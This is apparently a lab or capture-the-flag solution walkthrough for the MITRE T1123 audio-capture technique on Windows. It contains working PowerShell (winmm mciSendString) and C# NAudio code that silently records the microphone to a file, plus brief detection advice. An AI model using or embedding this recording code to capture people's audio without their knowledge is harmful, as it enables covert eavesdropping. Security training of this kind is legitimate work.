# T1123 – Audio Capture | Solution Walkthrough
**Difficulty:** Expert | **OS:** Windows | **MITRE:** T1123

## Step 1 – Run Demo & Understand Pipeline
```powershell
powershell -File "C:\ProgramData\audio_capture_demo.ps1"
# Shows audio capture pipeline and retrieves the flag
```

## Step 2 – Windows Audio Capture APIs
```powershell
# Method 1: mciSendString (Windows MCI)
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class MCI {
    [DllImport("winmm.dll")] public static extern int mciSendString(string s, System.Text.StringBuilder r, int n, System.IntPtr h);
}
"@
# Start recording:
[MCI]::mciSendString("open new type waveaudio alias rec", $null, 0, [IntPtr]::Zero)
[MCI]::mciSendString("record rec", $null, 0, [IntPtr]::Zero)
Start-Sleep 5
# Stop and save:
[MCI]::mciSendString("stop rec", $null, 0, [IntPtr]::Zero)
[MCI]::mciSendString("save rec C:\Windows\Temp\capture.wav", $null, 0, [IntPtr]::Zero)
[MCI]::mciSendString("close rec", $null, 0, [IntPtr]::Zero)
```

## Step 3 – NAudio (Real C# Implementation)
```csharp
// Requires NAudio.dll — used by real implants:
var waveIn = new WaveInEvent { WaveFormat = new WaveFormat(44100, 1) };
var writer  = new WaveFileWriter("capture.wav", waveIn.WaveFormat);
waveIn.DataAvailable += (s,a) => writer.Write(a.Buffer, 0, a.BytesRecorded);
waveIn.StartRecording();
Thread.Sleep(5000);
waveIn.StopRecording();
writer.Dispose();
```

## Step 4 – Retrieve Flag
```powershell
Get-Content "C:\Windows\System32\flag_T1123.txt"
# HACKTIFY{AUDIO_CAPTURE_<hostname>}
```

## Detection
- Monitor processes accessing audio devices (WaveIn/WASAPI)
- Alert on unusual processes (not videoconferencing apps) using audio
- Windows 10+: Privacy → Microphone shows which apps accessed mic
